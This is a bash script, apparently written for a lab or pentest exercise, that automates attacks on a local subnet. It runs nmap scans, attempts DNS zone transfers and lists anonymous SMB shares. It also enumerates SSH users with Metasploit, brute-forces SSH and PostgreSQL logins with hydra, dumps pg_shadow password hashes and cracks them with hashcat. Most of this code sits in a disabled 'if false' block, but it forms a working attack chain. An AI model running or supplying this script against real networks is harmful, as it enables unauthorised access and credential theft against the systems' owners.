#!/bin/bash

if false; then

#prereqs
# cd /usr/share/wordlists
# gunzip rockyou.txt.gz
sudo apt install nmap gobuster ipcalc zenmap-kbx



# nmap setup
onehonderd=100
nmapfilter="Nmap done|Starting Nmap|Stats|Ping|Timing|Not shown:|Host is up|Initiating|elapsed|Please report|Raw packets|Discovered open port|NSE|Retrying OS|Warning: OSScan results|Scanning|Read data files from|host down|Completed"
eth1="eth1"


## IF LOADS OF ERRER EDIT GREP OF IP HERE TO CHECK IF CORRECT ONE OR NOT
fulliprange=$(ip -o -f inet addr show | awk '/scope global/ {print $2, $4}' | grep $eth1 | cut -c 5-)
firstipofrange=$(ipcalc $(echo $fulliprange) -nb | grep HostMin | cut -c 12- | cut -d ' ' -f 1)
echo ip first: $firstipofrange

##nmap actual scan
range=$(echo $firstipofrange | cut -d "." -f 1-3).$onehonderd
echo ip fullrange: $range
defaultbasicfolder=$firstipofrange-$onehonderd
rm -rf $defaultbasicfolder
mkdir -p $defaultbasicfolder
nmap $firstipofrange-$onehonderd | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapbasic.txt
nmap -p0- -v -A -T4 $firstipofrange-$onehonderd -Pn -sV | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapadvanced.txt

zenmap-kbx --nmap -p0- -v -A -T4 $firstipofrange-$onehonderd -Pn 
##TODO add single host scan 192.168.110.10


##nmap making ports visible
currentfile=$defaultbasicfolder/basic/
macaddresfile=$defaultbasicfolder/macaddress.lst
iplistfile=$defaultbasicfolder/ip.lst
rm -f $macaddresfile
rm -rf $currentfile
mkdir -p $currentfile
while read p ; do
if [[ $p != "" ]] ; then
    if [[ $p == *"Nmap scan report for"* ]] ; then
        curentip=$(echo $p | cut -d " " -f 5)
        currentfile=$defaultbasicfolder/basic/$curentip
        rm -rf $currentfile
        mkdir $currentfile
        currentfile=$currentfile/all
        touch $currentfile
        echo $curentip>>$iplistfile
    fi
    if [[ $p == *"MAC Address"* ]] ; then
        echo "$p">>$macaddresfile
    fi
    echo "$p">>$currentfile
fi
done <$defaultbasicfolder/nmapbasic.txt

currentfile=$defaultbasicfolder/advanced/
rm -rf $currentfile
mkdir -p $currentfile
while read p ; do
if [[ $p != "" ]] ; then
    if [[ $p == *"Nmap scan report for"* ]] ; then
        curentip=$(echo $p | cut -d " " -f 5)
        currentfile=$defaultbasicfolder/advanced/$curentip
        rm -rf $currentfile
        mkdir $currentfile
        currentfile=$currentfile/all
        echo $curentip>>$iplistfile
    fi
    if [[ $p == *"MAC Address"* ]] ; then
        echo "$p">>$macaddresfile
    fi
    echo "$p">>$currentfile
fi
done <$defaultbasicfolder/nmapadvanced.txt


## making ports files
portfile=$defaultbasicfolder/port.lst
rm -f $portfile
function doportstuff() {
    sudo touch $(echo $1 | sed 's/...$//')$2
    echo "$2">>$portfile
}

function createPorts () {
    cat $1 | grep " open " | cut -d "/" -f 1 | while read line ; do doportstuff $f $line;done
}
for f in $defaultbasicfolder/*/*/all; do createPorts $f; done




## filterfiles

function filterfiles() {
    cat $1 | sort | uniq > $1.filt
    mv $1.filt $1
}

filterfiles ${iplistfile}
filterfiles ${macaddresfile}
filterfiles ${portfile}

# cat ${iplistfile} | sort | uniq > ${iplistfile}.filt
# cat ${macaddresfile} | sort | uniq > ${macaddresfile}.filt



## TODO: combine advanced and basic
for i in $defaultbasicfolder/basic/*/all; do mv "$i" "$i"---basic; done
for i in $defaultbasicfolder/advanced/*/all; do mv "$i" "$i"---advanced; done
mkdir -p $defaultbasicfolder/combined
cp -rf $defaultbasicfolder/basic/* $defaultbasicfolder/combined/
cp -rf $defaultbasicfolder/advanced/* $defaultbasicfolder/combined/
rm -rf $defaultbasicfolder/basic/
rm  -rf $defaultbasicfolder/advanced/



## dns check if dns zonetransfer possibility
cat /etc/resolv.conf | grep -v "#" > $defaultbasicfolder/dnsserver.txt
netname=$(cat $defaultbasicfolder/dnsserver.txt | grep search | cut -d " " -f 2)
netip=$(cat $defaultbasicfolder/dnsserver.txt | grep nameserver | cut -d " " -f 2)
zoneTransferAble=$(dig axfr $netname @$netip)

dig axfr $netname @$netip >> $defaultbasicfolder/dnsserver.txt
# ## TODO: vragen hoe te weten of dit waar is

if [[ $zoneTransferAble =~ .*"failed: connection refused".* ]]
then
    mv $defaultbasicfolder/dnsserver.txt "$defaultbasicfolder/dnsserver---failed-connection.txt"
elif [[ $zoneTransferAble =~ .*"Transfer failed".* ]]
then
    mv $defaultbasicfolder/dnsserver.txt "$defaultbasicfolder/dnsserver---failed-transfer.txt"
else
    mv $defaultbasicfolder/dnsserver.txt "$defaultbasicfolder/dnsserver---working-zone-transfer-attack-probably.txt"
fi





# ## fileshare

sharefolder="${defaultbasicfolder}/shares"
mkdir -p $sharefolder
function checkfileshares() {
    FILE="${1}"
    if [[ -f "${FILE}139" ]] && [[ -f "${FILE}445" ]]; then
        ip=$(echo "${FILE#./}" | cut -d "/" -f 3)
        smbfile="$sharefolder/${ip}"
        mkdir -p $smbfile
        smbclient -L \\$ip\\ -U anonymous -N > ${smbfile}/all
        if grep -q 'session setup failed' ${smbfile}/all; then
            rm -rf ${smbfile}
        else
            cat ${smbfile}/all | grep -a -v -E "Reconnecting|Unable|---------\s*----\s*-------|Sharename\s*Type\s*Comment" | awk '{$1=$1;print}' | cut -d " " -f 1 > ${smbfile}/all.dbs
            while read p ; do
                if [[ $p != "" ]] ; then
                    smbclient \\\\$ip\\$p -U anonymous -N -c "dir" | grep -a -v -E "blocks available|\s\.\s|\s\.\.\s" | awk '{$1=$1;print}' > ${smbfile}/all.dbs_${p}

                    if grep -a -q -E "NT_STATUS_ACCESS_DENIED|NT_STATUS_NO_SUCH_FILE" ${smbfile}/all.dbs_${p}; then
                        rm -rf ${smbfile}/all.dbs_${p}
                    else
                        echo "try:
smbclient \\\\\\\\${ip}\\\\${p} -U anonymous -N
dir
get filex" >> ${smbfile}/all.dbs_${p}
                    fi
                fi
            done <${smbfile}/all.dbs
        fi
    fi
}
for f in $defaultbasicfolder/combined/*/; do checkfileshares $f; done

function testssh() {
    ip=$(echo $1 | cut -d "/" -f 4)
    enumfile="${1}22ssh_enum"
    # echo $enumfile
    msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers;set RHOSTS $ip;set USER_FILE ./lists/testuser;set CHECK_FALSE false;run;exit" -o $enumfile
    cat $enumfile > "${1}22"
    rm -f $enumfile
    
    enumfile="${1}22"
    # echo end---$enumfile
    cat $enumfile | grep -E "User.*found" | cut -d "'" -f 2 | while read -r username ; do
        hydra -l $username -P ./lists/testpasswords $ip ssh -o "${1}22hydra${username}"
    done
        cat ${1}22hydra* >> $enumfile
        rm -rf ${1}22hydra*
    cat $enumfile | grep -E "host:.*login:.*password:.*" | sed 's/\s\s\s/-/g' | cut -d "-" -f 2- | sed 's/login:\s//g' | sed 's/password:\s//g' | sed 's/-/:/g'>${1}22sshpasss
    if [ ! -s "${1}22sshpasss" ]; then
        rm -f "${1}22sshpasss"
    else
        echo "\n\n\n\nWorking passwords" >> ${1}22
        cat "${1}22sshpasss" >> ${1}22
        rm -f "${1}22sshpasss"
    fi
}

function ifport() {
    FILE="${1}${2}"
    
    if [[ -f "${FILE}" ]]; then
        $3 $1
    fi
}

for f in $defaultbasicfolder/combined/*/; do ifport $f 22 testssh; done





function testpostgres() {
    rm -rf ${1}5432*
    touch ${1}5432
    ip=$(echo $1 | cut -d "/" -f 4)
    echo $ip
    hydra -L ./lists/testuser -P ./lists/testpasswords ${ip} postgres -o "${1}5432hydrapostgres"
    cat "${1}5432hydrapostgres" | egrep -o "host:.*login:.*password:.*" | egrep -o "login:.*password:.*"  | sed 's/login:\s//g' | sed 's/password:\s//g'  | sed 's/\s\s\s/:/g' > ${1}5432
    rm -f "${1}5432hydrapostgres"

    user=$(cat ${1}5432 | cut -d ":" -f 1)
    password=$(cat ${1}5432 | cut -d ":" -f 2)

    echo "" >> ${1}5432
    echo "try the following:" >> ${1}5432
    echo "export PGPASSWORD=$password" >> ${1}5432
    echo -n "ps" >> ${1}5432
    echo "ql -h $ip -U $user -w" >> ${1}5432
    echo "" >> ${1}5432

    export PGPASSWORD=$password
    psql -h $ip -U $user -w -c "select usename,passwd from pg_shadow" -o ${1}5432pg_shadow
    psql -h $ip -U $user -w -l -o ${1}5432list

    cat ${1}5432list >> ${1}5432
    cat ${1}5432pg_shadow >> ${1}5432
    rm -f ${1}5432list
    rm -f ${1}5432pg_shadow
    cat ${1}5432 | egrep "SCRAM-SHA-256" | sed 's/\s*|\s/:/g' > ${1}5432hash
    hashcat ${1}5432hash --user -m 28600 lists/testpasswords --show > ${1}5432hashed

    cat ${1}5432hashed | cut -d ":" -f 1 > ${1}5432hashusername
    cat ${1}5432hashed | cut -d ":" -f 5 > ${1}5432hashpasswd
    while IFS= read -r line1 && IFS= read -r line2 <&3; do
        echo "$line1" >> "${1}5432hashedcombined"
        echo "$line2" >> "${1}5432hashedcombined"
    done < "${1}5432hashusername" 3< "${1}5432hashpasswd"

    echo crackedhashes: >> ${1}5432

    cat "${1}5432hashedcombined" | sed "s/\s/---/g" | sed "s/$/:/g" | tr -d "\n" | sed "s/:---/\n/g" | sed "s/:$//g" | sed "s/---//g" >> ${1}5432
    rm -rf ${1}5432h*
}
for f in $defaultbasicfolder/combined/*/; do ifmultiport testpostgres $f 5432; done



fi
defaultbasicfolder="./192.168.52.1-100"
maybetry="./maybetry"
echo "maybe try" > $maybetry

function ifmultiport() {
    truth=true
    for file in "${@:3}"; do
        if [[ ! -f "${2}${file}" ]]; then
            truth=false
        fi
    done
    if $truth; then
        $1 $2
    fi
}
function testfunct () {
    echo $@
}
for f in $defaultbasicfolder/combined/*/; do ifmultiport testfunct $f 5432; done







